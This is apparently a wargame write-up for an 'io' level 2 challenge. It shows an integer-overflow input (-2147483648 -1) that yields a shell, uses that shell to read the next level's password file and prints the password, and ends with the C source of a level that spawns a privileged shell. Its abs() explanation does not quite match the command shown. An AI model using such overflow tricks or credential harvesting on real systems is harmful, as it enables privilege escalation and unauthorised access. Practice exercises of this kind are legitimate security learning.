/*
 *
 */
level02
Quoting the abs() man page:

Trying to take the absolute value of the most negative integer is not
defined.
As this is not defined, the compiler does as it pleases. With GCC, the value returned will be the most negative integer itself, causing abs() to do nothing.

level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c

WIN!
sh-4.1$
There we go! Level 2 is complete.

sh-4.2$ cd /home/level3
sh-4.2$ more .pass
Ib3F7i7FqjziuDOBKi
sh-4.2$




level02_a

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define answer 3.141593

void main(int argc, char **argv) {

        float a = (argc - 2)?: strtod(argv[1], 0);

        printf("You provided the number %f which is too ", a);


        if(a < answer)
                 puts("low");
        else if(a > answer)
                puts("high");
        else
                execl("/bin/sh", "sh", "-p", NULL);
}
